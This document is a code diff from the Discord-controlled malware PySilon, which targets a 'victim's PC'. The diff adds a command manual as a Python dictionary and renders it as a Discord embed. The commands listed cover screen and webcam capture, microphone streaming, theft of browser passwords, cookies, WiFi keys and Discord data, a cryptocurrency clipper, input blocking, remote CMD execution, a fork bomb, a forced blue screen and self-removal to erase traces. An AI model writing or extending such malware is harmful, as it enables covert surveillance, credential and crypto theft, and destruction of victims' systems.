@@ -374,6 +374,39 @@ async def on_raw_reaction_remove(payload):
         await message.unpin()
         #.log Unpinned reacted message
 
+help = {
+    'commands': {
+        'ss': ['➡️ `.ss`', 'Takes a screenshot of the victim\'s PC'],
+        'screenrec': ['➡️ `.screenrec`', 'Records the screen of the victim\'s PC for 15 seconds'],
+        'join': ['➡️ `.join`', 'Makes the BOT join a voice channel and live-stream microphone input'],
+        'show': ['➡️ `.show <what-to-show>`', 'Displays information about specified subject. Options:\n🔹processes - displays all running processes'],
+        'kill': ['➡️ `.kill <process-name>`', 'Kills a specified process. Options:\n🔹process-name - kills a specific process based on .show generated process-names'],
+        'block-input': ['➡️ `.block-input`', 'Blocks keyboard and mouse inputs of the victim\'s PC'],
+        'unblock-input': ['➡️ `.unblock-input`', 'Unblocks keyboard and mouse inputs of the victim\'s PC'],
+        'start-clipper': ['➡️ `.start-clipper`', 'Starts the Crypto Clipper thread on the victim\'s PC'],
+        'stop-clipper': ['➡️ `.stop-clipper`', 'Stops the Crypto Clipper thread on the victim\'s PC'],
+        'grab': ['➡️ `.grab <what-to-grab>`', 'Grabs specified information. Options:\n🔹passwords - grabs all browser-saved passwords\n🔹history - grabs the browser history\n🔹cookies - grabs browser-cookies\n🔹wifi - grabs all WiFi saved passwords\n🔹discord - grabs all possible information from victim\'s Discord account'],
+        'clear': ['➡️ `.clear`', 'Clears all messages on the file-related channel'],
+        'pwd': ['➡️ `.pwd`', 'Displays current directory path'],
+        'ls': ['➡️ `.ls`', 'Lists current directory content'],
+        'cd': ['➡️ `.cd <directory>`', 'Changes working directory. Options:\n🔹directory - the destination directory (.. is the previous directory)'],
+        'tree': ['➡️ `.tree`', 'Displays the current directory\'s structure'],
+        'download': ['➡️ `.download <file-or-directory-name>`', 'Downloads specified file or folder. Options:\n🔹file-or-directory-name - name of file or directory that you want to download'],
+        'upload': ['➡️ `.upload <type> <name>`', 'Uploads a file to victim\'s PC. Options:\n🔹type - single/multiple files whether it\'s smaller or larger than 25MB (single=smaller, multiple=larger)\n🔹name - name of uploaded file on victim\'s PC'],
+        'execute': ['➡️ `.execute <file-name>`', 'Execute specified file on the victim\'s PC'],
+        'remove': ['➡️ `.remove <file-or-directory-name>`', 'Removes the specified file or directory. Options:\n🔹file-or-directory-name - name of file or directory that you want to remove'],
+        'blacklist': ['➡️ `.blacklist <process-name>`', 'Adds the specified process to the blacklist.'],
+        'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
+        'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
+        'forkbomb': ['➡️ `.forkbomb`', 'Creates a self-replicating process until the victim\'s PC crashes.'],
+        'tts': ['➡️ `.tts <message>`', 'Plays a Text-to-Speech voice message.'],
+        'msg': ['➡️ `.msg <parameters>`', 'Displays a custom message box to the victim\'s PC. Parameters:\n🔹text="" - The main text of the msg box\n🔹title="" - The title of the msg box\n🔹style="" - The msg box style (1, 2, 3, 4, 5, 6)'],
+        'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
+        'bsod': ['➡️ `.bsod`', 'Triggers a Blue Screen of Death on the victim\'s PC.'],
+        'implode': ['➡️ `.implode`', 'Entirely wipes the malware off of the victim\'s PC (to remove traces).']
+    }
+}
+
 @client.event
 async def on_message(message):
     global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop, input_blocked, custom_message_to_send
@@ -410,7 +443,10 @@ async def on_message(message):
                 #.log Removed the message
                 if message.content.strip() == '.help':
                     #.log Author wants general help
-                    reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [anonfiles-link]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.screenrec\n.block-input\n.unblock-input\n.start-clipper\n.stop-clipper\n.bsod\n.cmd [command]\n.cd [dir]\nDetailed List here: https://github.com/mategol/PySilon-malware/wiki/Commands```'); await reaction_msg.add_reaction('🔴')
+                    embed = discord.Embed(title='List of all available commands', color=0x49fc03)
+                    for i in help['commands'].keys():
+                        embed.add_field(name=help['commands'][i][0], value=help['commands'][i][1], inline=False)
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                     #.log Sent message with PySilon commands manual
 
             elif expectation == 'key':
